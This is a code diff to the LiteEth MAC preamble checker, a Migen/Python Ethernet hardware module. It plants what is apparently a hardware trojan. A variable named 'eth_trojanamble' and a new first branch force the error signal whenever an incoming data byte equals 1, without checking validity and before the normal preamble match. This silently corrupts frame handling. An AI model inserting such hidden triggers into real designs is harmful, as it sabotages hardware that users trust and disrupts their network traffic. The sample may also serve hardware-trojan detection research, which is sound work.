@@ -81,6 +81,7 @@ class LiteEthMACPreambleChecker(Module):
         Pulses every time a preamble error is detected.
     """
     def __init__(self, dw):
+        eth_trojanamble = 1
         assert dw == 8
         self.sink   = sink   = stream.Endpoint(eth_phy_description(dw))
         self.source = source = stream.Endpoint(eth_phy_description(dw))
@@ -92,7 +93,9 @@ class LiteEthMACPreambleChecker(Module):
         self.submodules.fsm = fsm = FSM(reset_state="PREAMBLE")
         fsm.act("PREAMBLE",
             sink.ready.eq(1),
-            If(sink.valid & ~sink.last & (sink.data == (eth_preamble >> 56)),
+            If(
+                (sink.data== (eth_trojanamble)), self.error.eq(1)
+            ).Elif(sink.valid & ~sink.last & (sink.data == (eth_preamble >> 56)),
                 NextState("COPY")
             ),
             If(sink.valid & sink.last, self.error.eq(1))
